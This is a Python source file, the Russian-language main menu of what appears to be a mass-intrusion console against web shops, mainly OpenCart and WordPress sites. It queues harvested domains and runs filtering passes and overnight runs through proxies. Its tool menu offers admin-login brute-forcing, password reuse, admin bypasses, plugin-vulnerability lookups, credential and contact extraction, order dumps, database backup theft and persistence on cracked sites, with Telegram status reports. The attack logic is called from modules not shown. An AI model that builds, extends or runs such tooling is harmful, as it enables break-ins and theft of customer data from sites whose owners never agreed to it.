# -*- coding: utf-8 -*-
import os
import shutil
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core import browser, config, http, notify, queue, state, store, ui
from modules import mass

STOP = os.path.join(config.DATA, "STOP")


def pick():
    h = ui.ask("домен")
    if not h:
        return ""
    h = h.replace("https://", "").replace("http://", "").split("/")[0].lower()
    store.save(h, store.get(h))
    store.set_current(h)
    state.put(h)
    return h


def _kind(h):
    from modules import engine
    try:
        k = engine.detect(h)
        if isinstance(k, tuple):
            k = k[0]
        return k or "opencart"
    except Exception:
        return "opencart"


def _title(h):
    try:
        return mass._title(http.get(h, "/").text)
    except Exception:
        return ""


def _creds(h):
    cur = store.get(h).get("creds") or ""
    v = ui.ask("учётка user:pass (пусто = как в профиле)", cur)
    if v:
        d = store.get(h)
        d["creds"] = v
        store.save(h, d)
    return v


def do_targets():
    while True:
        ui.clear()
        ui.banner()
        c = state.counts()
        ui.head("ЦЕЛИ", "очередь %d, годных %d, в работе %d" % (c["new"], c["hot"], c["manual"]))
        ui.item("1", "показать очередь")
        ui.item("2", "добавить домены вручную")
        ui.item("3", "импорт из файла")
        ui.item("4", "собрать поиском")
        ui.item("5", "выбрать цель")
        ui.item("6", "показать мусор")
        ui.item("7", "вернуть из мусора")
        ui.item("8", "статистика")
        ui.item("0", "назад")
        ch = ui.ask("пункт")
        if ch == "0":
            return
        if ch == "1":
            for h in queue.queue()[:60]:
                ui.say("%-32s %s" % (h, state.status(h)))
            ui.pause()
        elif ch == "2":
            raw = ui.ask("домены через запятую")
            got = [x.strip().lower() for x in raw.split(",") if x.strip()]
            queue.add(got)
            for h in got:
                state.put(h)
            ui.ok("добавлено: %d" % len(got))
            ui.pause()
        elif ch == "3":
            p = ui.ask("путь к файлу")
            if p and os.path.isfile(p):
                with open(p, encoding="utf-8", errors="ignore") as f:
                    got = [l.strip().lower() for l in f if l.strip()]
                queue.add(got)
                for h in got:
                    state.put(h)
                ui.ok("добавлено: %d" % len(got))
            ui.pause()
        elif ch == "4":
            from modules import harvest
            ui.head("СБОР ДОМЕНОВ")
            harvest.run()
            ui.pause()
        elif ch == "5":
            h = pick()
            if h:
                ui.ok("цель: " + h)
                ui.pause()
        elif ch == "6":
            for h in queue.trash()[:60]:
                ui.say(h)
            ui.pause()
        elif ch == "7":
            h = ui.ask("домен")
            if h:
                queue.restore(h)
                state.set_status(h.lower(), "new")
                ui.ok("в очереди: " + h)
            ui.pause()
        elif ch == "8":
            c = state.counts()
            for k in state.ORDER:
                ui.say("%-10s %d" % (k, c[k]))
            ui.pause()


def do_run():
    while True:
        ui.clear()
        ui.banner()
        ui.head("ПРОГОН", "STOP: " + ("есть" if os.path.isfile(STOP) else "нет"))
        ui.item("1", "фильтр и глубина", "сначала отсев, потом годное")
        ui.item("2", "только ночной", "по всей очереди")
        ui.item("3", "поставить STOP")
        ui.item("4", "снять STOP")
        ui.item("0", "назад")
        c = ui.ask("пункт")
        if c == "0":
            return
        if c == "1":
            from modules import mass as m
            ui.head("ФИЛЬТР")
            m.run()
            hot = [d["host"] for d in state.by_status("hot")]
            if not hot:
                ui.say("годных нет, глубина не нужна")
                ui.pause()
                continue
            ui.say("годных после фильтра: %d" % len(hot))
            if ui.ask("пустить глубину по ним (1 да / 0 нет)", "1") == "1":
                from modules import night
                w = ui.ask("потоков", "3")
                lim = ui.ask("сколько целей", str(min(len(hot), 10)))
                md = ui.ask("режим: 1 тихий / 2 полный", "1")
                try:
                    w = int(w)
                except Exception:
                    w = 3
                try:
                    lim = int(lim)
                except Exception:
                    lim = len(hot)
                night.run(only=hot, n_workers=w, n_limit=lim, n_mode=md)
            ui.pause()
        elif c == "2":
            from modules import night
            import traceback
            ui.head("НОЧНОЙ ПРОГОН")
            try:
                night.run()
            except Exception:
                ui.err("упал:")
                print(traceback.format_exc())
            ui.pause()
        elif c == "3":
            with open(STOP, "w", encoding="utf-8") as f:
                f.write("manual")
            ui.ok("STOP поставлен")
            ui.pause()
        elif c == "4":
            try:
                os.remove(STOP)
            except Exception:
                pass
            ui.ok("STOP снят")
            ui.pause()


def _card(h):
    st = state.get(h)
    prof = store.get(h)
    ui.clear()
    ui.banner()
    ui.head("КАРТОЧКА  ->  " + h, st.get("status", "?"))
    ui.say("баллы: %s   машина: %s   время: %s" % (st.get("score", 0), st.get("machine", "-"), st.get("at", "-")))
    if prof.get("kind"):
        ui.say("движок: " + str(prof["kind"]))
    if prof.get("creds"):
        ui.ok("вход: " + str(prof["creds"]))
    notes = prof.get("notes") or []
    if notes:
        ui.say("находки: " + ", ".join(notes)[:200])
    d = os.path.join(config.DATA, "dossier", h + ".txt")
    ui.say("досье: " + (("%d байт" % os.path.getsize(d)) if os.path.isfile(d) else "нет"))
    ui.say("сессия: " + ("да" if os.path.isfile(browser.state_path(h)) else "нет"))


def _next_hot():
    for d in state.by_status("hot"):
        h = d["host"]
        if not state.is_locked(h):
            return h
    return ""


def do_triage():
    while True:
        h = _next_hot()
        if not h:
            ui.clear()
            ui.banner()
            ui.head("РАЗБОР", "пусто")
            ui.say("годных целей нет")
            ui.pause()
            return
        state.acquire(h)
        state.set_status(h, "manual", note="взят в разбор")
        while True:
            _card(h)
            ui.item("1", "собрать досье")
            ui.item("2", "инструменты")
            ui.item("3", "проверить доступ")
            ui.item("4", "открыть сессию")
            ui.item("5", "заметка")
            ui.item("6", "готово, в отработанные")
            ui.item("7", "в мусор")
            ui.item("8", "отложить и следующая")
            ui.item("9", "следующая")
            ui.item("0", "выйти из разбора")
            c = ui.ask("пункт")
            if c == "0":
                state.release(h)
                return
            if c == "1":
                from modules import dossier
                dossier.run(h)
                ui.pause()
            elif c == "2":
                do_tools(h)
            elif c == "3":
                try:
                    r = http.get(h, "/")
                    ui.say("код %d, размер %d" % (r.status_code, len(r.content)))
                except Exception as e:
                    ui.err("сбой: %s" % e)
                ui.pause()
            elif c == "4":
                try:
                    stt = browser.grab(h, store.get(h).get("url"))
                    browser.save_state(h, stt)
                    ui.ok("кук: %d" % len(stt.get("cookies", [])))
                except Exception as e:
                    ui.err("сбой: %s" % e)
                ui.pause()
            elif c == "5":
                t = ui.ask("текст заметки")
                if t:
                    d = store.get(h)
                    d.setdefault("diary", []).append("%s %s" % (state.get(h).get("at", ""), t))
                    store.save(h, d)
                    ui.ok("записано")
                ui.pause()
            elif c == "6":
                state.set_status(h, "cracked", note="обработано")
                queue.drop_hot(h, "done")
                state.release(h)
                break
            elif c == "7":
                state.set_status(h, "trash", note="в мусор")
                queue.drop_hot(h, "trash")
                state.release(h)
                break
            elif c == "8":
                state.set_status(h, "hot", note="отложено")
                state.release(h)
                break
            elif c == "9":
                state.release(h)
                break


def do_dossier(h):
    from modules import dossier
    ui.head("ДОСЬЕ  ->  " + h)
    p = dossier.run(h)
    ui.say("файл: " + p)
    if ui.ask("показать содержимое (1 да / 0 нет)", "1") == "1":
        ui.clear()
        with open(p, encoding="utf-8", errors="ignore") as f:
            print(f.read()[:20000])
    ui.pause()


def tool_engine(h):
    from modules import engine
    k = _kind(h)
    ui.say("движок: %s" % k)
    ui.say("версия: %s" % (engine.version(h, k) or "не определена"))


def tool_profile(h):
    from modules import profiles
    p = profiles.get(_kind(h))
    ui.say("файлы: " + ", ".join(p.get("files", [])[:10]))
    ui.say("админка: " + ", ".join(p.get("admin", [])))
    ui.say("поле входа: " + str(p.get("login_field")))


def tool_mods(h):
    from modules import mods
    got = mods.run(h) or []
    for path, param, val in mods.routes(got):
        try:
            r = http.get(h, "%s&%s=%s" % (path, param, val))
            ui.say("%s %s" % (r.status_code, path))
        except Exception as e:
            ui.say("сбой %s: %s" % (path, e))


def tool_subdom(h):
    from modules import subdom
    for s in subdom.run(h) or []:
        ui.say(s)


def tool_arch(h):
    from modules import arch
    for u, name in arch.run(h) or []:
        ui.say("%s  %s" % (u, name))


def tool_admin(h):
    from modules import bypass
    for p in ("/admin/", "/admin/index.php?route=common/login"):
        try:
            r = http.get(h, p)
            ui.say("%s %s размер %d" % (r.status_code, p, len(r.content)))
        except Exception as e:
            ui.say("сбой %s: %s" % (p, e))
    bypass.report(bypass.extras(h, [_kind(h)]))


def tool_find_admin(h):
    import adminfind
    got = adminfind.run(h, 16, None, _kind(h)) or []
    if got:
        ui.ok("найдено: %d" % len(got))
    else:
        ui.say("пусто")


def tool_brute(h):
    from modules import brute
    res = brute.run(h, _title(h), True, _kind(h))
    if not isinstance(res, tuple):
        res = (res,)
    state = res[0] if res and isinstance(res[0], str) else "none"
    creds = ":".join(str(x) for x in res[1:] if x) if state == "ok" else None
    if state == "ok" and creds:
        d = store.get(h)
        d["creds"] = creds
        store.save(h, d)
        ui.ok("вход: " + creds)
    elif state == "captcha":
        ui.say("капча - паркую")
    elif state == "limit":
        ui.say("лимит попыток - паркую")
    elif state == "blocked":
        ui.say("блок по IP - нужен прокси")
    elif state == "noform":
        ui.say("формы входа нет")
    else:
        ui.say("не подобрал")


def tool_reuse(h):
    from modules import reuse
    c = _creds(h)
    if c:
        for x in reuse.run(h, c) or []:
            ui.say(x)


def tool_wp(h):
    from modules import wp, wpvuln
    us = wp.users(h) or []
    ui.say("логины: " + (", ".join(us) or "нет"))
    pl = wp.plugins(h) or []
    ui.say("плагины: " + (", ".join(pl) or "нет"))
    if pl:
        for v in wpvuln.run(h, pl) or []:
            ui.say("уязв: " + v)


def tool_creds(h):
    from modules import creds
    p = os.path.join(config.LOGS, h + "_files.txt")
    if not os.path.isfile(p):
        ui.say("сначала файлы")
        return
    with open(p, encoding="utf-8", errors="ignore") as f:
        body = f.read()[:400000]
    ui.say(creds.run(h, body) or "пусто")


def tool_dump(h):
    from modules import admin
    c = _creds(h)
    if c:
        ui.say(admin.dump(h, c, _kind(h)) or "пусто")


def tool_orders(h):
    from modules import orders
    c = _creds(h)
    if c:
        ui.say("заказов: %s" % (orders.run(h, c) or "0"))


def tool_backup(h):
    from modules import admin
    c = _creds(h)
    if c:
        ui.say("база: %s байт" % (admin.backup(h, c) or "0"))


def tool_keep(h):
    from modules import keep
    c = _creds(h)
    if c:
        ui.say(keep.keep(h, c) or "не закрепился")


TOOLS = [
    ("1", "движок и версия", tool_engine),
    ("2", "профиль движка", tool_profile),
    ("3", "сторонние модули", tool_mods),
    ("4", "поддомены", tool_subdom),
    ("5", "архивы", tool_arch),
    ("6", "админка и обходы", tool_admin),
    ("7", "подбор пароля", tool_brute),
    ("8", "повтор пароля", tool_reuse),
    ("9", "WordPress", tool_wp),
    ("10", "слив контактов", tool_creds),
    ("11", "заказы OpenCart", tool_orders),
    ("12", "бэкап базы", tool_backup),
    ("13", "закрепление", tool_keep),
    ("14", "поиск админки", tool_find_admin),
]


def do_tools(h):
    while True:
        ui.clear()
        ui.banner()
        ui.head("ИНСТРУМЕНТЫ  ->  " + h)
        for n, text, _ in TOOLS:
            ui.item(n, text)
        ui.item("0", "назад")
        c = ui.ask("пункт")
        if c == "0":
            return
        for n, text, fn in TOOLS:
            if c == n:
                ui.head(text.upper() + "  ->  " + h)
                try:
                    fn(h)
                except Exception as e:
                    ui.err("сбой: %s" % e)
                ui.pause()
                break


def do_service():
    while True:
        ui.clear()
        ui.banner()
        c = notify.cfg()
        free = shutil.disk_usage(config.DATA).free // (1024 ** 3)
        ui.head("СЛУЖБА", "машина " + state.machine())
        ui.say("свободно на диске: %d ГБ" % free)
        ui.say("телеграм: " + ("настроен" if c.get("tg_token") and c.get("tg_chat") else "нет"))
        ui.say("пульс: " + ("вкл" if c.get("tg_beat", True) else "выкл"))
        ui.say("картинка: " + ("вкл" if c.get("tg_photo", True) else "выкл"))
        ui.item("1", "проверить сеть")
        ui.item("2", "прокси и VPN")
        ui.item("3", "настроить телеграм")
        ui.item("4", "послать пульс")
        ui.item("5", "имя машины")
        ui.item("6", "переключить пульс")
        ui.item("7", "переключить картинку")
        ui.item("0", "назад")
        ch = ui.ask("пункт")
        if ch == "0":
            return
        if ch == "1":
            for p in ("google.com", "cloudflare.com", "example.com"):
                try:
                    r = http.get(p, "/", timeout=10)
                    ui.say("%s -> %s" % (p, r.status_code))
                except Exception as e:
                    ui.say("%s -> %s" % (p, e))
            ui.pause()
        elif ch == "2":
            from core import proxies
            ui.say("в файле: %d" % len(proxies.load()))
            ui.item("1", "импорт из файла")
            ui.item("2", "проверить и почистить")
            ui.item("3", "очистить пул")
            sub = ui.ask("пункт")
            if sub == "1":
                proxies.import_file(ui.ask("путь к файлу со списком"))
            elif sub == "2":
                good, total = proxies.check_all()
                ui.ok("живых %d из %d" % (good, total))
            elif sub == "3":
                proxies.save([])
                ui.ok("пул очищен")
            ui.pause()
        elif ch == "3":
            tok = ui.ask("токен бота (пусто = не менять)")
            chat = ui.ask("id чата (пусто = не менять)")
            upd = {}
            if tok:
                upd["tg_token"] = tok
            if chat:
                upd["tg_chat"] = chat
            if upd:
                notify.save_cfg(upd)
                ui.ok("сохранено")
            ui.pause()
        elif ch == "4":
            ok, info = notify.send2(notify.hello_text())
            ui.ok("отправлено") if ok else ui.err("не ушло: " + info)
            ui.pause()
        elif ch == "5":
            v = ui.ask("имя машины (пусто = как есть)", state.machine())
            if v:
                notify.save_cfg({"machine": v})
                ui.ok("машина: " + v)
            ui.pause()
        elif ch == "6":
            notify.save_cfg({"tg_beat": not c.get("tg_beat", True)})
            ui.pause()
        elif ch == "7":
            notify.save_cfg({"tg_photo": not c.get("tg_photo", True)})
            ui.pause()


def do_reports():
    ui.clear()
    ui.banner()
    ui.head("ОТЧЁТЫ")
    ui.item("R", "собрать отчёт по последнему прогону")
    runs = []
    if os.path.isdir(config.RUNS):
        runs = sorted(os.listdir(config.RUNS), reverse=True)[:15]
    for i, n in enumerate(runs, 1):
        ui.item(str(i), n)
    ui.item("0", "назад")
    c = ui.ask("пункт")
    if c.upper() == "R":
        from modules import report
        runs2 = sorted(os.listdir(config.RUNS), reverse=True) if os.path.isdir(config.RUNS) else []
        if runs2:
            report.run(os.path.join(config.RUNS, runs2[0]))
        else:
            ui.say("прогонов нет")
        ui.pause()
        return
    if c == "0" or not c.isdigit():
        return
    try:
        d = os.path.join(config.RUNS, runs[int(c) - 1])
    except Exception:
        return
    rep = os.path.join(d, "report.txt")
    ui.say("каталог: " + d)
    if os.path.isfile(rep):
        with open(rep, encoding="utf-8", errors="ignore") as f:
            print(f.read()[:8000])
    ui.pause()


def _beat():
    import threading
    import time as t

    def loop():
        while True:
            t.sleep(config.HEARTBEAT)
            try:
                notify.beat()
            except Exception:
                pass

    threading.Thread(target=loop, daemon=True).start()


def _dispatch(ch, h):
    if ch == "9":
        return False
    if ch == "1":
        do_targets()
    elif ch == "2":
        do_run()
    elif ch == "3":
        do_triage()
    elif ch in ("4", "5") and not h:
        ui.err("сначала цель")
        ui.pause()
    elif ch == "4":
        do_dossier(h)
    elif ch == "5":
        do_tools(h)
    elif ch == "6":
        do_service()
    elif ch == "7":
        from modules import tplui
        tplui.run(h)
    elif ch == "8":
        do_reports()
    return True


def main():
    ui.enable()
    ui.intro()
    _beat()
    while True:
        ui.clear()
        ui.banner()
        h = store.current()
        c = state.counts()
        ui.head("ЦЕЛЬ: " + (h or "не выбрана"),
                "очередь %d · годных %d · входов %d" % (c["new"], c["hot"], c["cracked"]))
        ui.item("1", "ЦЕЛИ", "сбор, импорт, очередь, выбор")
        ui.item("2", "ПРОГОН", "массовый и ночной, STOP")
        ui.item("3", "РАЗБОР", "годное по одной")
        ui.item("4", "ДОСЬЕ", "автосбор по цели")
        ui.item("5", "ИНСТРУМЕНТЫ", "по выбранной цели")
        ui.item("6", "СЛУЖБА", "сеть, прокси, телеграм, машина")
        ui.item("7", "ШАБЛОНЫ", "библиотека дыр")
        ui.item("8", "ОТЧЁТЫ", "прогоны")
        ui.item("9", "выход")
        try:
            ch = ui.ask("пункт")
            if not _dispatch(ch, h):
                print()
                ui.warn("выход")
                return
        except KeyboardInterrupt:
            print()
            ui.warn("прервано")
            ui.pause()


if __name__ == "__main__":
    main()
